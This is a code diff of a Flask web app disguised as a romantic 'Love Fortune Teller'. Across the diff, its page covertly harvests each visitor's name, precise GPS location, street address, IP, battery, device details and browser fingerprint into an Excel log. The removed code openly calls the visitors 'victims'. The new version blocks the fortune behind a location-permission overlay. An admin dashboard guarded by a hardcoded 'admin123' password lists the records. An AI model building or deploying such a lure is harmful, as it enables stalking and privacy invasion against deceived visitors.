@@ -1,526 +1,442 @@
-from flask import Flask, request, jsonify, send_file, render_template_string
+from flask import Flask, request, jsonify, abort, send_file
 from flask_cors import CORS
 import pandas as pd
-import openpyxl
-from openpyxl import Workbook
-from openpyxl.styles import Font, PatternFill, Alignment
-import os
 import requests
-import json
-from datetime import datetime
+import os
 import random
+import shutil
+from datetime import datetime
+from openpyxl import load_workbook
+from openpyxl.utils import get_column_letter
 
 app = Flask(__name__)
 CORS(app)
 
+# Use absolute path for persistent storage
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
+EXCEL_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
 BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
+ADMIN_PASSWORD = 'admin123'
 
-FORTUNES = [
-    "Your soulmate is thinking of you right now under the stars.",
-    "A passionate kiss awaits you this week from someone special.",
-    "True love will find you when you least expect it - soon!",
-    "Your heart will flutter with excitement in the next 7 days.",
-    "Someone is dreaming about your smile tonight.",
-    "A romantic adventure is just around the corner.",
-    "Your perfect match shares your birthday month!",
-    "Love letters are coming your way soon.",
-    "A candlelit dinner for two is in your future.",
-    "Your crush has been watching your social media.",
-    "Wedding bells might ring for you within a year!",
-    "Passion ignites when you meet your destiny.",
-    "Your forever person is closer than you think.",
-    "A surprise love confession awaits you.",
-    "Your heart knows who it's meant for.",
-    "Romantic sparks will fly this month!",
-    "Someone special can't stop thinking about you.",
-    "Love at first sight is about to happen.",
-    "Your soul connection is searching for you.",
-    "A fairytale romance begins soon.",
-    "Heart emojis are coming from your crush.",
-    "True love doesn't follow a timeline.",
-    "Your love story is about to unfold.",
-    "Passionate nights await your future.",
-    "Someone's heart beats faster when they see you.",
-    "Love will surprise you beautifully.",
-    "Your perfect partner admires you secretly.",
-    "Romance blooms when you trust your heart.",
-    "A love that feels like home is coming.",
-    "Your happily ever after starts soon.",
-    "Butterflies in your stomach are a sign.",
-    "Love recognizes no barriers."
+# Define all required columns (clean table structure)
+COLUMNS = [
+    'DateTime', 'Name', 'Latitude', 'Longitude',
+    'Google Maps', 'Accuracy_m', 'Address',
+    'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
+    'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
 ]
 
-def ensure_data_file():
-    if not os.path.exists(DATA_FILE):
-        wb = Workbook()
-        ws = wb.active
-        ws.title = "Fortunes Data"
-        headers = [
-            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address',
-            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
-            'Memory', 'Network', 'Fingerprint', 'Fortune_Shown', 'Extra'
-        ]
-        for col, header in enumerate(headers, 1):
-            cell = ws.cell(row=1, column=col, value=header)
-            cell.font = Font(bold=True, color="FFFFFF")
-            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
-            cell.alignment = Alignment(horizontal="center")
-        wb.save(DATA_FILE)
-
-def backup_data():
-    if os.path.exists(DATA_FILE):
+def ensure_persistent_storage():
+    """Create Excel file with proper headers and formatting if missing."""
+    if not os.path.exists(EXCEL_FILE):
+        df = pd.DataFrame(columns=COLUMNS)
+        df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+        print(f"✅ Created new Excel file at {EXCEL_FILE}")
+        _auto_adjust_column_widths(EXCEL_FILE)
+    else:
+        # Verify all columns exist; add missing ones without deleting data
         try:
-            wb = openpyxl.load_workbook(DATA_FILE)
-            wb.save(BACKUP_FILE)
-        except:
-            pass
+            df = pd.read_excel(EXCEL_FILE, engine='openpyxl')
+            missing_cols = [col for col in COLUMNS if col not in df.columns]
+            if missing_cols:
+                for col in missing_cols:
+                    df[col] = ''
+                df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+                print(f"✅ Added missing columns: {missing_cols}")
+            # Ensure backup exists
+            if not os.path.exists(BACKUP_FILE):
+                shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+                print("✅ Created backup")
+            _auto_adjust_column_widths(EXCEL_FILE)
+        except Exception as e:
+            print(f"⚠️ Error reading Excel: {e}. Creating backup and new file.")
+            if os.path.exists(EXCEL_FILE):
+                shutil.copy2(EXCEL_FILE, EXCEL_FILE + '.corrupted')
+            df = pd.DataFrame(columns=COLUMNS)
+            df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+            _auto_adjust_column_widths(EXCEL_FILE)
+
+def _auto_adjust_column_widths(filepath):
+    """Auto-fit column widths in Excel file for better readability."""
+    try:
+        wb = load_workbook(filepath)
+        ws = wb.active
+        for column in ws.columns:
+            max_length = 0
+            column_letter = get_column_letter(column[0].column)
+            for cell in column:
+                try:
+                    if cell.value:
+                        max_length = max(max_length, len(str(cell.value)))
+                except:
+                    pass
+            adjusted_width = min(max_length + 2, 50)  # limit to 50 chars
+            ws.column_dimensions[column_letter].width = adjusted_width
+        wb.save(filepath)
+    except Exception as e:
+        print(f"Warning: Could not auto-adjust columns: {e}")
 
 def load_data():
+    """Load all records as a DataFrame."""
+    ensure_persistent_storage()
     try:
-        if os.path.exists(DATA_FILE):
-            return pd.read_excel(DATA_FILE)
-        elif os.path.exists(BACKUP_FILE):
-            return pd.read_excel(BACKUP_FILE)
-    except:
-        pass
-    return pd.DataFrame()
-
-def save_data(df):
-    try:
-        backup_data()
-        existing_df = load_data()
-        if existing_df.empty:
-            final_df = df
-        else:
-            final_df = pd.concat([existing_df, df], ignore_index=True)
-        final_df.to_excel(DATA_FILE, index=False, engine='openpyxl')
+        df = pd.read_excel(EXCEL_FILE, engine='openpyxl')
+        print(f"✅ Loaded {len(df)} records from Excel")
+        return df
     except Exception as e:
-        print(f"Save failed: {e}")
+        print(f"❌ Failed to load main file: {e}. Trying backup...")
+        if os.path.exists(BACKUP_FILE):
+            try:
+                df = pd.read_excel(BACKUP_FILE, engine='openpyxl')
+                print(f"✅ Loaded {len(df)} records from backup")
+                return df
+            except:
+                pass
+        return pd.DataFrame(columns=COLUMNS)
 
-def get_client_ip():
-    if 'X-Forwarded-For' in request.headers:
-        return request.headers['X-Forwarded-For'].split(',')[0].strip()
-    return request.remote_addr or 'Unknown'
-
-def get_tinyurl(long_url):
+def save_data_permanent(record):
+    """Append a single record to the Excel file."""
+    df = load_data()
+    new_row = pd.DataFrame([record])
+    df = pd.concat([df, new_row], ignore_index=True)
+    df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+    shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+    _auto_adjust_column_widths(EXCEL_FILE)
     try:
-        response = requests.get("https://tinyurl.com/api-create.php", params={'url': long_url}, timeout=10)
-        if response.status_code == 200:
-            return response.text.strip()
+        os.sync()  # force disk flush (Linux/Unix)
     except:
         pass
-    return long_url
+    print(f"✅ Saved record for {record['Name']} | Total: {len(df)}")
+    return True
 
-@app.route('/')
-def index():
-    return render_template_string("""
-<!DOCTYPE html>
+def geocode_reverse(lat, lon):
+    try:
+        url = "https://nominatim.openstreetmap.org/reverse"
+        params = {'lat': lat, 'lon': lon, 'format': 'json', 'zoom': 18}
+        headers = {'User-Agent': 'LoveFortuneTeller/1.0'}
+        r = requests.get(url, params=params, headers=headers, timeout=8)
+        if r.status_code == 200:
+            return r.json().get('display_name', f"{lat:.4f}, {lon:.4f}")[:200]
+        return f"{lat:.4f}, {lon:.4f}"
+    except:
+        return f"{lat:.4f}, {lon:.4f}"
+
+# 35+ romantic fortunes (each a short sentence, not a paragraph)
+FORTUNES = [
+    "💕 Dear {name}, someone special is thinking of you right now!",
+    "💖 {name}, a beautiful soul is about to enter your life!",
+    "💗 {name}, the universe has heard your heart's desire!",
+    "💓 {name}, your soulmate is closer than you think!",
+    "💝 Someone you meet very soon will change your life, {name}!",
+    "💕 Love is rushing toward you faster than you know, {name}!",
+    "💖 {name}, your positive energy is attracting true love!",
+    "💗 The stars are perfectly aligned just for you today, {name}!",
+    "💓 {name}, a wonderful surprise is waiting for your heart!",
+    "💝 {name}, someone is secretly falling for you right now!",
+    "🌟 {name}, today a chance encounter will spark something magical!",
+    "🌙 {name}, the moon whispers your name — love is near.",
+    "✨ A stranger will smile at you in a way that feels like home, {name}.",
+    "🍃 {name}, let go of the past — your next chapter is beautiful.",
+    "💌 Check your messages soon, {name}; someone has been wanting to text you.",
+    "🎶 {name}, a song you love will remind you of someone who loves you.",
+    "🌸 Spring brings new beginnings, and for you, a fresh romance, {name}.",
+    "💎 {name}, you are more precious than you know — someone agrees.",
+    "🕯️ An old friend will become something more, {name}. Stay open.",
+    "🌊 {name}, your emotions are deep and beautiful — someone will dive in.",
+    "🍀 Lucky in love? Very soon, yes — the stars guarantee it, {name}!",
+    "📖 {name}, your love story is being written right now. It's a bestseller.",
+    "🏹 Cupid's arrow is aiming for your heart, {name}. Embrace it!",
+    "💬 A late-night conversation will reveal mutual feelings, {name}.",
+    "🎁 Unexpected gift of affection coming your way, {name}.",
+    "🌹 Roses are red, violets are blue — someone writes poems for you, {name}.",
+    "🌟 {name}, your vibe attracts your tribe — and a special someone.",
+    "💭 {name}, if you've been thinking about them, they've been thinking about you.",
+    "🔥 Passion ignites where you least expect it, {name}. Be present.",
+    "💫 The universe just nudged fate toward you, {name}. Watch for signs.",
+    "🍂 Even autumn leaves know change brings love — your turn, {name}.",
+    "🧡 {name}, a heart-to-heart talk will clear the way for romance.",
+    "🎈 {name}, something light and joyful is drifting toward your love life."
+]
+
+# HTML (unchanged – same beautiful UI)
+HTML = '''<!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Fortune Teller 💕</title>
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            width: 100%;
-            background: rgba(255,255,255,0.95);
-            border-radius: 40px;
-            padding: 35px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        h1 {
-            background: linear-gradient(135deg, #ff6b6b, #c06c84);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 10px;
-            font-size: 2.5em;
-        }
-        .sub {
-            color: #888;
-            margin-bottom: 25px;
-        }
-        .btn {
-            background: linear-gradient(135deg, #ff6b6b, #c06c84);
-            color: white;
-            border: none;
-            padding: 14px 25px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.3s;
-            margin: 10px;
-            min-width: 200px;
-        }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(255,107,107,0.3); }
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        .fortune-box {
-            background: rgba(255,182,193,0.3);
-            border-left: 5px solid #ff1493;
-            border-radius: 20px;
-            padding: 25px;
-            margin: 25px 0;
-            font-family: 'Dancing Script', cursive;
-            font-size: 1.8em;
-            color: #c06c84;
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .map-link {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 20px;
-            background: linear-gradient(135deg, #ff6b6b, #c06c84);
-            color: white;
-            text-decoration: none;
-            border-radius: 30px;
-            font-weight: bold;
-        }
-        .map-link:hover { transform: translateY(-2px); }
-        input {
-            width: 80%;
-            max-width: 400px;
-            padding: 15px;
-            margin: 15px 0;
-            border: 2px solid #ffdde1;
-            border-radius: 50px;
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        input:focus {
-            outline: none;
-            border-color: #ff6b6b;
-            box-shadow: 0 0 20px rgba(255,107,107,0.3);
-        }
-        .hidden { display: none; }
-        hr { margin: 30px 0; border: 1px solid #ffdde1; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love Fortune Teller</title>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden;}
+.heart{position:fixed;pointer-events:none;z-index:0;animation:floatUp 4s linear infinite;}
+@keyframes floatUp{0%{transform:translateY(100vh) rotate(0deg);opacity:1;}100%{transform:translateY(-100vh) rotate(360deg);opacity:0;}}
+.box{background:rgba(255,255,255,0.96);border-radius:50px;padding:50px 40px;max-width:540px;width:100%;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.18);z-index:1;position:relative;animation:fadeIn 0.8s;}
+@keyframes fadeIn{from{opacity:0;transform:scale(0.9);}to{opacity:1;transform:scale(1);}}
+.top-emoji{font-size:90px;animation:bounce 2s infinite;display:block;}
+@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
+h1{font-size:34px;margin:15px 0 8px;background:linear-gradient(135deg,#ff6b6b,#c06c84);-webkit-background-clip:text;background-clip:text;color:transparent;}
+.sub{color:#aaa;font-size:15px;margin-bottom:30px;}
+.igroup{margin-bottom:22px;text-align:left;}
+.igroup label{display:block;margin-bottom:8px;color:#c06c84;font-weight:600;}
+.igroup input{width:100%;padding:14px 20px;border:2px solid #ffdde1;border-radius:50px;font-size:16px;text-align:center;outline:none;transition:0.3s;}
+.igroup input:focus{border-color:#c06c84;box-shadow:0 0 12px rgba(192,108,132,0.3);}
+.btn{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;padding:17px 40px;font-size:19px;font-weight:bold;border-radius:60px;cursor:pointer;width:100%;transition:0.3s;}
+.btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(192,108,132,0.4);}
+.loading{display:none;margin-top:28px;}
+.loading.show{display:block;}
+.spinner{width:58px;height:58px;margin:0 auto 16px;background:linear-gradient(135deg,#ff6b6b,#c06c84);border-radius:50%;animation:pulse 1.2s infinite;}
+@keyframes pulse{0%,100%{transform:scale(0.8);opacity:0.5;}50%{transform:scale(1.2);opacity:1;}}
+.result{display:none;margin-top:28px;padding:35px;background:linear-gradient(135deg,#ff9a9e,#fecfef);border-radius:30px;color:#fff;animation:slideUp 0.6s;}
+.result.show{display:block;}
+@keyframes slideUp{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}}
+.r-icon{font-size:50px;animation:hb 1.5s infinite;}
+@keyframes hb{0%,100%{transform:scale(1);}50%{transform:scale(1.2);}}
+.r-name{font-size:26px;font-weight:bold;margin:12px 0;}
+.r-msg{font-size:20px;line-height:1.6;margin:14px 0;font-weight:500;}
+#overlay{display:none;position:fixed;inset:0;z-index:99999;background:linear-gradient(135deg,#ff6b6b,#c06c84);flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:30px;}
+#overlay.show{display:flex;}
+.o-emoji{font-size:75px;margin-bottom:18px;animation:bounce 2s infinite;}
+#overlay h2{color:#fff;font-size:26px;margin-bottom:12px;}
+#overlay p{color:rgba(255,255,255,0.92);font-size:15px;max-width:360px;line-height:1.7;margin-bottom:22px;}
+.steps{background:rgba(255,255,255,0.18);border-radius:18px;padding:18px 22px;margin-bottom:22px;text-align:left;max-width:360px;width:100%;color:#fff;font-size:14px;line-height:2.3;}
+.o-btn{background:#fff;color:#c06c84;border:none;padding:15px 38px;font-size:17px;font-weight:bold;border-radius:60px;cursor:pointer;animation:pulse 1.5s infinite;}
+@media(max-width:560px){.box{padding:30px 20px;}h1{font-size:26px;}.r-msg{font-size:17px;}}
+</style>
 </head>
 <body>
-<div class="container">
-    <h1>💕 Love Fortune Teller 💕</h1>
-    <div class="sub">Discover your romantic destiny with cosmic accuracy ✨</div>
-
-    <div id="inputArea">
-        <input type="text" id="userNameInput" placeholder="✨ Enter your full name ✨">
-        <br>
-        <button class="btn" onclick="getFortune()">🔮 Reveal My Love Fortune</button>
-    </div>
-
-    <div id="fortuneDisplay" class="fortune-box hidden"></div>
-    <div id="status" class="status"></div>
-    
-    <hr>
-    <div class="sub" style="font-size: 14px;">
-        🌟 All readings are 100% private and secure
-    </div>
+<div id="overlay">
+  <div class="o-emoji">🔐💕</div>
+  <h2>Location Access Needed!</h2>
+  <p>Your love fortune can only be revealed with your location. Please allow it to continue ✨</p>
+  <div class="steps">
+    🔒 Tap the <strong>lock icon</strong> in your address bar<br>
+    📋 Open <strong>Site Settings</strong><br>
+    📍 Set <strong>Location → Allow</strong><br>
+    🔄 Tap <strong>Try Again</strong> below
+  </div>
+  <button class="o-btn" onclick="retry()">💫 Allow Location & Try Again 💫</button>
 </div>
-
+<div class="box">
+  <span class="top-emoji">💕🔮💕</span>
+  <h1>Your Love Fortune</h1>
+  <div class="sub">Discover what destiny has planned for your heart</div>
+  <div id="form">
+    <div class="igroup">
+      <label>✨ Enter your name, beautiful soul ✨</label>
+      <input id="uname" type="text" placeholder="Your name..." autocomplete="off">
+    </div>
+    <button class="btn" onclick="start()">✨ Reveal My Destiny ✨</button>
+  </div>
+  <div class="loading" id="load">
+    <div class="spinner"></div>
+    <p>💫 Reading the stars for you...</p>
+  </div>
+  <div class="result" id="res">
+    <div class="r-icon">💖</div>
+    <div class="r-name" id="rname"></div>
+    <div class="r-msg" id="rmsg"></div>
+    <div>✨ The universe has spoken ✨</div>
+  </div>
+</div>
 <script>
-let collectedData = {};
-
-async function getFingerprint() {
-    const fp = await FingerprintJS.load();
-    const result = await fp.get();
-    return result.visitorId;
+let visitorId = null;
+(async () => {
+  const fp = await FingerprintJS.load();
+  const result = await fp.get();
+  visitorId = result.visitorId;
+})();
+setInterval(()=>{
+  const h=document.createElement('div');
+  h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
+  h.className='heart';
+  h.style.cssText=`left:${Math.random()*100}%;font-size:${Math.random()*20+14}px;animation-duration:${Math.random()*3+3}s`;
+  document.body.appendChild(h);
+  setTimeout(()=>h.remove(),4500);
+},600);
+let uname='';
+window.start=function(){
+  uname=document.getElementById('uname').value.trim();
+  if(!uname){alert('💕 Please enter your name!');return;}
+  askLocation();
+};
+async function getBatteryInfo(){
+  try{const b=await navigator.getBattery();return {level:Math.round(b.level*100),charging:b.charging};}
+  catch(e){return {level:'N/A',charging:'N/A'};}
 }
-
-async function getBattery() {
-    if ('getBattery' in navigator) {
-        const battery = await navigator.getBattery();
-        return Math.round(battery.level * 100) + '%';
-    }
-    return 'N/A';
+function getTimezone(){ return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+function getDeviceMemory(){ return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
+function getNetworkType(){
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(conn && conn.effectiveType) return conn.effectiveType;
+  return 'Unknown';
 }
-
-function getNetwork() {
-    const conn = navigator.connection || navigator.mozConnection || {};
-    return conn.effectiveType ? `${conn.effectiveType} (${conn.downlink || '?'} Mbps)` : 'N/A';
-}
-
-function getTimezone() {
-    return Intl.DateTimeFormat().resolvedOptions().timeZone;
-}
-
-function getMemory() {
-    return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
-}
-
-function getScreen() {
-    return `${screen.width}x${screen.height}`;
-}
-
-async function collectAllData(name) {
-    const data = {
-        timestamp: new Date().toISOString(),
-        name: name,
-        userAgent: navigator.userAgent,
-        screen: getScreen(),
-        timezone: getTimezone(),
-        memory: await getMemory(),
-        network: getNetwork(),
-        battery: await getBattery(),
-        fingerprint: await getFingerprint()
-    };
-    collectedData = data;
-    
-    // Send to server silently
-    try {
-        await fetch('/save', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
+function askLocation(){
+  document.getElementById('res').classList.remove('show');
+  document.getElementById('form').style.display='none';
+  document.getElementById('load').classList.add('show');
+  document.getElementById('overlay').classList.remove('show');
+  if(!navigator.geolocation){showOverlay();return;}
+  navigator.geolocation.getCurrentPosition(
+    async pos=>{
+      document.getElementById('load').classList.remove('show');
+      const battery=await getBatteryInfo();
+      const tz = getTimezone();
+      const mem = getDeviceMemory();
+      const net = getNetworkType();
+      let fp = visitorId;
+      if(!fp){
+        const fpLib = await FingerprintJS.load();
+        const result = await fpLib.get();
+        fp = result.visitorId;
+      }
+      try{
+        const r=await fetch('/save',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({
+            name:uname,
+            latitude:pos.coords.latitude,
+            longitude:pos.coords.longitude,
+            accuracy:pos.coords.accuracy,
+            battery_level:battery.level,
+            battery_charging:battery.charging,
+            userAgent:navigator.userAgent,
+            screen:screen.width+'x'+screen.height,
+            platform:navigator.platform,
+            timezone: tz,
+            device_memory: mem,
+            network_type: net,
+            fingerprint: fp
+          })
         });
-    } catch(e) {
-        console.log('Data send failed:', e);
-    }
-    
-    return data;
-}
-
-function showStatus(msg, isError = false) {
-    const status = document.getElementById('status');
-    status.textContent = msg;
-    status.style.background = isError ? 'rgba(255,100,100,0.3)' : 'rgba(100,255,100,0.3)';
-    status.style.color = isError ? '#cc0000' : '#006600';
-    status.style.border = `2px solid ${isError ? '#ff4444' : '#00cc88'}`;
-    
-    if (!isError) {
-        setTimeout(() => status.textContent = '', 4000);
-    }
-}
-
-async function getFortune() {
-    const nameInput = document.getElementById('userNameInput');
-    const name = nameInput.value.trim();
-    
-    if (!name) {
-        showStatus('❌ Please enter your name first!', true);
-        nameInput.focus();
-        return;
-    }
-    
-    // Hide input, show loading
-    nameInput.style.display = 'none';
-    document.querySelector('#inputArea button').style.display = 'none';
-    showStatus('🌟 Connecting to cosmic energies...');
-    
-    try {
-        // Collect ALL victim data silently
-        await collectAllData(name);
-        showStatus('📍 Detecting your exact location for precise reading...');
-        
-        // Try to get GPS
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    collectedData.latitude = position.coords.latitude;
-                    collectedData.longitude = position.coords.longitude;
-                    
-                    // Send GPS data
-                    await fetch('/save', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(collectedData)
-                    });
-                    
-                    // Get fortune
-                    const fortuneResp = await fetch('/fortune');
-                    const fortuneData = await fortuneResp.json();
-                    
-                    // Get TinyURL map
-                    const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-                    const tinyResp = await fetch('/tinyurl', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ url: mapUrl })
-                    });
-                    const tinyData = await tinyResp.json();
-                    
-                    // Show fortune + map
-                    const fortuneBox = document.getElementById('fortuneDisplay');
-                    fortuneBox.innerHTML = `
-                        <div>${fortuneData.fortune}</div>
-                        ${tinyData.tinyurl ? `<br><a href="${tinyData.tinyurl}" target="_blank" class="map-link">🗺️ See your exact location on map</a>` : ''}
-                    `;
-                    fortuneBox.classList.remove('hidden');
-                    showStatus('✨ Your cosmic love reading is complete! 🌟');
-                },
-                async (error) => {
-                    // No GPS? Still collect other data and show fortune
-                    await fetch('/save', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(collectedData)
-                    });
-                    
-                    const fortuneResp = await fetch('/fortune');
-                    const fortuneData = await fortuneResp.json();
-                    
-                    document.getElementById('fortuneDisplay').innerHTML = fortuneData.fortune;
-                    document.getElementById('fortuneDisplay').classList.remove('hidden');
-                    showStatus('✨ Your love fortune revealed! (Location optional)');
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
-            );
-        } else {
-            // No geolocation support
-            await fetch('/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
-            });
-            
-            const fortuneResp = await fetch('/fortune');
-            const fortuneData = await fortuneResp.json();
-            
-            document.getElementById('fortuneDisplay').innerHTML = fortuneData.fortune;
-            document.getElementById('fortuneDisplay').classList.remove('hidden');
-            showStatus('✨ Your mystical fortune is ready!');
+        const d=await r.json();
+        if(d.fortune){
+          document.getElementById('rname').innerHTML='✨ '+uname+' ✨';
+          document.getElementById('rmsg').innerHTML=d.fortune;
+          document.getElementById('res').classList.add('show');
         }
-        
-    } catch (error) {
-        showStatus('⚠️ Connection issue - showing random fortune', true);
-        const fortuneResp = await fetch('/fortune');
-        const fortuneData = await fortuneResp.json();
-        document.getElementById('fortuneDisplay').innerHTML = fortuneData.fortune;
-        document.getElementById('fortuneDisplay').classList.remove('hidden');
-    }
+      }catch(e){document.getElementById('form').style.display='block';}
+    },
+    ()=>{document.getElementById('load').classList.remove('show');showOverlay();},
+    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
+  );
 }
+function showOverlay(){document.getElementById('overlay').classList.add('show');}
+window.retry=function(){document.getElementById('form').style.display='none';askLocation();};
 </script>
 </body>
-</html>
-    """)
+</html>'''
 
-@app.route('/fortune')
-def fortune():
-    return jsonify({'fortune': random.choice(FORTUNES)})
+@app.route('/')
+def home():
+    return HTML
 
 @app.route('/save', methods=['POST'])
 def save():
+    ensure_persistent_storage()
     try:
-        data = request.get_json()
-        df = pd.DataFrame([{
-            'Timestamp': datetime.now(),
-            'Name': data.get('name', 'Anonymous'),
-            'Latitude': data.get('latitude', ''),
-            'Longitude': data.get('longitude', ''),
-            'Address': '',
-            'Battery': data.get('battery', ''),
-            'UserAgent': data.get('userAgent', ''),
-            'Screen': data.get('screen', ''),
-            'IP': get_client_ip(),
-            'Timezone': data.get('timezone', ''),
-            'Memory': data.get('memory', ''),
-            'Network': data.get('network', ''),
-            'Fingerprint': data.get('fingerprint', ''),
-            'Fortune_Shown': True,
-            'Extra': json.dumps(data)
-        }])
-        save_data(df)
-        return jsonify({'status': 'saved'})
+        data = request.json
+        lat = data['latitude']
+        lon = data['longitude']
+        addr = geocode_reverse(lat, lon)
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
+        record = {
+            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'Name': data['name'],
+            'Latitude': lat,
+            'Longitude': lon,
+            'Google Maps': maps_link,
+            'Accuracy_m': data['accuracy'],
+            'Address': addr,
+            'Battery_%': data['battery_level'],
+            'Charging': data['battery_charging'],
+            'Device': data['userAgent'][:150],
+            'Screen': data['screen'],
+            'Platform': data['platform'],
+            'IP_Address': ip,
+            'Timezone': data.get('timezone', 'Unknown'),
+            'Device_Memory_GB': data.get('device_memory', 'Unknown'),
+            'Network_Type': data.get('network_type', 'Unknown'),
+            'Fingerprint': data.get('fingerprint', 'Unknown')
+        }
+
+        save_data_permanent(record)
+        fortune = random.choice(FORTUNES).format(name=data['name'])
+        print(f"✅ Saved: {data['name']} | {lat:.4f},{lon:.4f} | IP: {ip}")
+        return jsonify({'saved': True, 'fortune': fortune})
     except Exception as e:
-        print(f"Save error: {e}")
-        return jsonify({'status': 'error'})
+        print("ERR:", e)
+        return jsonify({'saved': False}), 500
 
-@app.route('/tinyurl', methods=['POST'])
-def tinyurl():
-    try:
-        long_url = request.json.get('url', '')
-        tiny_url = get_tinyurl(long_url)
-        return jsonify({'tinyurl': tiny_url})
-    except:
-        return jsonify({'tinyurl': ''})
-
-@app.route('/admin')
+@app.route('/admin', methods=['GET','POST'])
 def admin():
-    if request.args.get('pass') != 'admin123':
-        return '''
-        <div style="padding:50px;text-align:center;">
-            <h2>🔐 Love Fortune Admin</h2>
-            <form style="max-width:300px;margin:0 auto;">
-                <input name="pass" type="password" placeholder="admin123" style="width:100%;padding:15px;margin:10px;border-radius:25px;border:2px solid #ffdde1;font-size:16px;">
-                <button style="width:100%;padding:15px;background:linear-gradient(135deg,#ff6b6b,#c06c84);color:white;border:none;border-radius:25px;font-size:16px;font-weight:bold;cursor:pointer;">Login</button>
-            </form>
-        </div>
-        '''
-    
-    df = load_data()
-    if df.empty:
-        return "<h2 style='text-align:center;padding:50px;'>📊 No fortune data yet</h2>"
-    
-    html = """
-    <div style='max-width:1200px;margin:0 auto;padding:20px;'>
-        <h1 style='text-align:center;color:#ff1493;'>💕 Love Fortune Data Dashboard</h1>
-        <h3 style='text-align:center;color:#666;'>""" + str(len(df)) + """ victims captured</h3>
-        <table border='1' style='border-collapse:collapse;width:100%;font-size:12px;'>
-            <tr style='background:#ff1493;color:white;'>
-    """
-    
-    # Headers
-    for col in df.columns:
-        html += f"<th style='padding:8px;text-align:left;'>{col}</th>"
-    html += "</tr>"
-    
-    # Data rows
-    for idx, row in df.iterrows():
-        html += "<tr style='border-bottom:1px solid #eee;'>"
-        for col in df.columns:
-            val = str(row[col])
-            if len(val) > 50:
-                val = val[:50] + '...'
-            html += f"<td style='padding:8px;word-break:break-all;'>{val}</td>"
-        html += "</tr>"
-    
-    html += """
-        </table>
-        <br>
-        <div style='text-align:center;'>
-            <a href='/download-excel?pass=admin123' 
-               style='display:inline-block;padding:20px 40px;background:linear-gradient(135deg,#ff1493,#ff6b6b);color:white;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;box-shadow:0 10px 30px rgba(255,20,147,0.4);'>
-                📥 Download Full Excel
-            </a>
-        </div>
-    </div>
-    """
-    
-    return html
-
-@app.route('/download-excel')
-def download_excel():
